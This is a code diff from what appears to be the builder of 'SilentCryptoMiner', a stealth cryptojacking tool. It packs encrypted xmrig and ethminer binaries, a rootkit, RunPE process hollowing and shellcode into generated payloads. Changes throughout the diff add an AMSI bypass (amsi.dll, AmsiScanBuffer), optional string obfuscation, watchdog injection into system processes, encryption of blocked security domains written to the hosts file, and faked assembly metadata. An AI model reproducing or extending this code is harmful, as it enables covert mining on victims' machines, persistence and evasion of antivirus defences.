@@ -43,36 +43,39 @@ namespace SilentCryptoMiner
             parameters.ReferencedAssemblies.Add("System.Management.dll");
             parameters.ReferencedAssemblies.Add("System.IO.Compression.dll");
             parameters.ReferencedAssemblies.Add("System.IO.Compression.FileSystem.dll");
-            parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
+            if (F.FormAO.toggleDebug.Checked)
+            {
+                parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
+            }
 
-            using (var R = new System.Resources.ResourceWriter(System.IO.Path.GetTempPath() + @"\" + F.Resources_parent + ".Resources"))
+            using (var R = new System.Resources.ResourceWriter(Path.GetTempPath() + @"\" + F.resources["parent"] + ".Resources"))
             {
                 if (F.mineXMR) { 
-                    R.AddResource(F.Resources_xmr, F.AES_Encryptor(Properties.Resources.xmrig));
-                    R.AddResource(F.Resources_winring, F.AES_Encryptor(Properties.Resources.WinRing0x64));
+                    R.AddResource(F.resources["xmr"], F.AES_Encryptor(Properties.Resources.xmrig));
+                    R.AddResource(F.resources["winring"], F.AES_Encryptor(Properties.Resources.WinRing0x64));
                     if (F.xmrGPU)
                     {
-                        R.AddResource(F.Resources_libs, F.AES_Encryptor(Properties.Resources.libs));
+                        R.AddResource(F.resources["libs"], F.AES_Encryptor(Properties.Resources.libs));
                     }
                 }
                 if (F.mineETH)
                 {
-                    R.AddResource(F.Resources_eth, F.AES_Encryptor(Properties.Resources.ethminer));
+                    R.AddResource(F.resources["eth"], F.AES_Encryptor(Properties.Resources.ethminer));
                 }
                 if (F.chkInstall.Checked && F.toggleWatchdog.Checked)
                 {
-                    R.AddResource(F.Resources_watchdog, F.AES_Encryptor(F.watchdogdata));
+                    R.AddResource(F.resources["watchdog"], F.AES_Encryptor(F.watchdogdata));
                 }
                 if (F.FormAO.toggleRootkit.Checked)
                 {
-                    R.AddResource(F.Resources_rootkiti, F.AES_Encryptor(Properties.Resources.rootkit_i));
+                    R.AddResource(F.resources["rootkit_i"], F.AES_Encryptor(Properties.Resources.rootkit_i));
                 }
-                R.AddResource(F.Resources_runpe, F.AES_Encryptor(Properties.Resources.RunPE));
+                R.AddResource(F.resources["runpe"], F.AES_Encryptor(Properties.Resources.RunPE));
 
                 R.Generate();
             }
 
-            parameters.EmbeddedResources.Add(System.IO.Path.GetTempPath() + @"\" + F.Resources_parent + ".Resources");
+            parameters.EmbeddedResources.Add(Path.GetTempPath() + @"\" + F.resources["parent"] + ".Resources");
             var minerbuilder = new StringBuilder(code);
             ReplaceGlobals(ref minerbuilder);
             var Results = CodeProvider.CompileAssemblyFromSource(parameters, minerbuilder.ToString());
@@ -80,7 +83,7 @@ namespace SilentCryptoMiner
             try
             {
                 File.Delete(savePath + ".manifest");
-                File.Delete(System.IO.Path.GetTempPath() + @"\" + F.Resources_parent + ".Resources");
+                File.Delete(Path.GetTempPath() + @"\" + F.resources["parent"] + ".Resources");
             }
             catch { }
 
@@ -225,14 +228,14 @@ namespace SilentCryptoMiner
 
             if (F.FormAO.toggleRootkit.Checked)
             {
-                using (var R = new System.Resources.ResourceWriter(Path.GetTempPath() + @"\" + F.Resources_parent + ".Resources"))
+                using (var R = new System.Resources.ResourceWriter(Path.GetTempPath() + @"\" + F.resources["parent"] + ".Resources"))
                 {
-                    R.AddResource(F.Resources_rootkitu, F.AES_Encryptor(Properties.Resources.rootkit_u));
-                    R.AddResource(F.Resources_runpe, F.AES_Encryptor(Properties.Resources.RunPE));
+                    R.AddResource(F.resources["rootkit_u"], F.AES_Encryptor(Properties.Resources.rootkit_u));
+                    R.AddResource(F.resources["runpe"], F.AES_Encryptor(Properties.Resources.RunPE));
                     R.Generate();
                 }
 
-                parameters.EmbeddedResources.Add(Path.GetTempPath() + @"\" + F.Resources_parent + ".Resources");
+                parameters.EmbeddedResources.Add(Path.GetTempPath() + @"\" + F.resources["parent"] + ".Resources");
             }
 
             var uninstallerbuilder = new StringBuilder(Properties.Resources.Uninstaller);
@@ -242,7 +245,7 @@ namespace SilentCryptoMiner
             try
             {
                 File.Delete(savePath + ".manifest");
-                File.Delete(Path.GetTempPath() + @"\" + F.Resources_parent + ".Resources");
+                File.Delete(Path.GetTempPath() + @"\" + F.resources["parent"] + ".Resources");
             }
             catch { }
 
@@ -299,18 +302,18 @@ namespace SilentCryptoMiner
                 string defs = "";
                 if (!string.IsNullOrEmpty(icoPath))
                 {
-                    resource.Replace("#ICON", ToLiteral(icoPath));
+                    resource.Replace("#ICON", F.ToLiteral(icoPath));
                     defs += " -DDefIcon";
                 }
 
                 if (assemblyData)
                 {
-                    resource.Replace("#TITLE", ToLiteral(F.txtAssemblyTitle.Text));
-                    resource.Replace("#DESCRIPTION", ToLiteral(F.txtAssemblyDescription.Text));
-                    resource.Replace("#COMPANY", ToLiteral(F.txtAssemblyCompany.Text));
-                    resource.Replace("#PRODUCT", ToLiteral(F.txtAssemblyProduct.Text));
-                    resource.Replace("#COPYRIGHT", ToLiteral(F.txtAssemblyCopyright.Text));
-                    resource.Replace("#TRADEMARK", ToLiteral(F.txtAssemblyTrademark.Text));
+                    resource.Replace("#TITLE", F.ToLiteral(F.txtAssemblyTitle.Text));
+                    resource.Replace("#DESCRIPTION", F.ToLiteral(F.txtAssemblyDescription.Text));
+                    resource.Replace("#COMPANY", F.ToLiteral(F.txtAssemblyCompany.Text));
+                    resource.Replace("#PRODUCT", F.ToLiteral(F.txtAssemblyProduct.Text));
+                    resource.Replace("#COPYRIGHT", F.ToLiteral(F.txtAssemblyCopyright.Text));
+                    resource.Replace("#TRADEMARK", F.ToLiteral(F.txtAssemblyTrademark.Text));
                     resource.Replace("#VERSION", string.Join(",", new string[] { F.txtAssemblyVersion1.Text, F.txtAssemblyVersion2.Text, F.txtAssemblyVersion3.Text, F.txtAssemblyVersion4.Text }));
                     defs += " -DDefAssembly";
                 }
@@ -325,7 +328,7 @@ namespace SilentCryptoMiner
                     return false;
                 
                 string shellcodebytes = Encoding.GetEncoding("ISO-8859-1").GetString(ConvertToShellcode(inputFile));
-                string shellcode = ToLiteral(Cipher(shellcodebytes, F.KEY));
+                string shellcode = F.ToLiteral(Cipher(shellcodebytes, F.KEY));
 
                 sb.Replace("startDelay", F.txtStartDelay.Text);
                 sb.Replace("#KEYLENGTH", F.KEY.Length.ToString());
@@ -426,7 +429,7 @@ namespace SilentCryptoMiner
         public static void CipherReplace(StringBuilder source, string id, string value)
         {
             source.Replace(id + "LENGTH", value.Length.ToString());
-            source.Replace(id, ToLiteral(Cipher(value, F.KEY)));
+            source.Replace(id, F.ToLiteral(Cipher(value, F.KEY)));
         }
 
         public static string Cipher(string data, string key)
@@ -445,30 +448,7 @@ namespace SilentCryptoMiner
             return string.Join("", result);
         }
 
-        public static string ToLiteral(string input)
-        {
-            var literal = new StringBuilder(input.Length + 2);
-            foreach (var c in input)
-            {
-                switch (c)
-                {
-                    case '\"': literal.Append("\\\""); break;
-                    case '\\': literal.Append(@"\\"); break;
-                    case '\0': literal.Append(@"\u0000"); break;
-                    case '\a': literal.Append(@"\a"); break;
-                    case '\b': literal.Append(@"\b"); break;
-                    case '\f': literal.Append(@"\f"); break;
-                    case '\n': literal.Append(@"\n"); break;
-                    case '\r': literal.Append(@"\r"); break;
-                    case '\t': literal.Append(@"\t"); break;
-                    case '\v': literal.Append(@"\v"); break;
-                    default:
-                        literal.Append(c);
-                        break;
-                }
-            }
-            return literal.ToString();
-        }
+        
 
         public static void CreateManifest(string path, bool administrator)
         {
@@ -481,7 +461,7 @@ namespace SilentCryptoMiner
 
         public static void ReplaceEncrypt(StringBuilder source, string id, string value)
         {
-            source.Replace($"\"{id}\"", $"_rGetString_(\"{F.EncryptString(value)}\")");
+            source.Replace($"\"{id}\"", F.FormAO.toggleDoObfuscation.Checked ? $"_rGetString_(\"{F.EncryptString(value)}\")" : $"\"{F.ToLiteral(value)}\"");
         }
 
         public static void ReplaceGlobals(ref StringBuilder stringb)
@@ -514,6 +494,11 @@ namespace SilentCryptoMiner
                 stringb.Replace("DefDebug", "true");
             }
 
+            if (F.FormAO.toggleDoObfuscation.Checked)
+            {
+                stringb.Replace("DefObfuscate", "true");
+            }
+
             if (F.toggleDisableSleep.Checked)
             {
                 stringb.Replace("DefDisableSleep", "true");
@@ -527,7 +512,7 @@ namespace SilentCryptoMiner
             if (F.chkBlockWebsites.Checked && !string.IsNullOrEmpty(F.txtBlockWebsites.Text))
             {
                 stringb.Replace("DefBlockWebsites", "true");
-                stringb.Replace("DOMAINSET", $"\"{string.Join("\", \"", F.txtBlockWebsites.Text.Split(','))}\"");
+                stringb.Replace("DOMAINSET", $"\"{string.Join("\", \"", F.txtBlockWebsites.Text.Split(',').Select(x => F.EncryptString(x)).ToArray())}\"");
             }
 
             if (F.xmrGPU)
@@ -580,7 +565,7 @@ namespace SilentCryptoMiner
                     installdir = "Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)";
                 }
 
-                stringb.Replace("PayloadPath", $"System.IO.Path.Combine({installdir}, _rGetString_(\"{F.EncryptString(F.txtInstallFileName.Text)}\"))");
+                stringb.Replace("PayloadPath", $"System.IO.Path.Combine({installdir}, {(F.FormAO.toggleDoObfuscation.Checked ? $"_rGetString_(\"{F.EncryptString(F.txtInstallFileName.Text)}\")" : $"\"{F.ToLiteral(F.txtInstallFileName.Text)}\"")})");
 
                 if (F.toggleWatchdog.Checked)
                 {
@@ -647,16 +632,20 @@ namespace SilentCryptoMiner
 
             ReplaceEncrypt(stringb, "#MINERQUERY", $"Select CommandLine from Win32_Process WHERE CommandLine LIKE '%{F.minerFind}%'");
             ReplaceEncrypt(stringb, "#GPUQUERY", "SELECT Name, VideoProcessor FROM Win32_VideoController");
+            ReplaceEncrypt(stringb, "#WATCHDOGQUERY", "Select CommandLine, ProcessID from Win32_Process");
             ReplaceEncrypt(stringb, "#WMISCOPE", @"\root\cimv2");
             ReplaceEncrypt(stringb, "#MINERID", F.minerFind);
             ReplaceEncrypt(stringb, "#SCMD", "cmd");
             ReplaceEncrypt(stringb, "#SPOWERSHELL", "powershell");
             ReplaceEncrypt(stringb, "#CONHOST", "System32\\conhost.exe");
+            ReplaceEncrypt(stringb, "#WATCHDOGINJ", F.FormAO.toggleRootkit.Checked ? "System32\\dialer.exe" : "System32\\conhost.exe");
             ReplaceEncrypt(stringb, "#HOSTSPATH", "drivers/etc/hosts");
             ReplaceEncrypt(stringb, "#HOSTSFORMAT", "\r\n0.0.0.0       {0}");
             ReplaceEncrypt(stringb, "#RUNPETYPE", "RunPE.RunPE");
             ReplaceEncrypt(stringb, "#RUNPEMETHOD", "Run");
             ReplaceEncrypt(stringb, "#SHELLCODEMETHOD", "Shellcode");
+            ReplaceEncrypt(stringb, "#AMSIDLL", "amsi.dll");
+            ReplaceEncrypt(stringb, "#AMSIBUFFER", "AmsiScanBuffer");
             ReplaceEncrypt(stringb, "#INSTALLPATH", F.txtInstallFileName.Text);
             ReplaceEncrypt(stringb, "#WR64", "WR64.sys");
             ReplaceEncrypt(stringb, "#ECTEMPLATE", "-EncodedCommand \"{0}\"");
@@ -664,6 +653,11 @@ namespace SilentCryptoMiner
             ReplaceEncrypt(stringb, "#STRNVIDIA", "nvidia");
             ReplaceEncrypt(stringb, "#STRAMD", "amd");
             ReplaceEncrypt(stringb, "#STRRNDPATH", $"{F.Randomi(F.rand.Next(10, 20), false)}\\{F.Randomi(F.rand.Next(5, 10), false)}.exe");
+            ReplaceEncrypt(stringb, "#STRVIDEOP", "VideoProcessor");
+            ReplaceEncrypt(stringb, "#STRNAME", "Name");
+            ReplaceEncrypt(stringb, "#STRCMDLINE", "CommandLine");
+            ReplaceEncrypt(stringb, "#STRPROCID", "ProcessID");
+            ReplaceEncrypt(stringb, "#STREXE", ".exe");
 
             stringb.Replace("#AESKEY", F.AESKEY);
             stringb.Replace("#SALT", F.SALT);
@@ -671,22 +665,20 @@ namespace SilentCryptoMiner
             ReplaceEncrypt(stringb, "#UNAMKEY", F.UNAMKEY);
             ReplaceEncrypt(stringb, "#UNAMIV", F.UNAMIV);
 
-            stringb.Replace("#RESPARENT", F.Resources_parent);
-            stringb.Replace("#RESETH", F.Resources_eth);
-            stringb.Replace("#RESXMR", F.Resources_xmr);
-            stringb.Replace("#RESLIBS", F.Resources_libs);
-            stringb.Replace("#RESWD", F.Resources_watchdog);
-            stringb.Replace("#RESRKI", F.Resources_rootkiti);
-            stringb.Replace("#RESRKU", F.Resources_rootkitu);
-            stringb.Replace("#RESWR", F.Resources_winring);
-            stringb.Replace("#RESRPE", F.Resources_runpe);
-
             stringb.Replace("startDelay", F.txtStartDelay.Text);
 
-            foreach (Match m in Regex.Matches(stringb.ToString(), "_r(.+?)_"))
+            foreach (var res in F.resources)
             {
-                foreach (Capture c in m.Captures)
-                    stringb.Replace(c.Value, F.Randomi(F.rand.Next(5, 40)));
+                ReplaceEncrypt(stringb, "#RES_" + res.Key, res.Value);
+            }
+
+            if (F.FormAO.toggleDoObfuscation.Checked)
+            {
+                foreach (Match m in Regex.Matches(stringb.ToString(), "_r(.+?)_"))
+                {
+                    foreach (Capture c in m.Captures)
+                        stringb.Replace(c.Value, F.Randomi(F.rand.Next(5, 40)));
+                }
             }
         }
     }
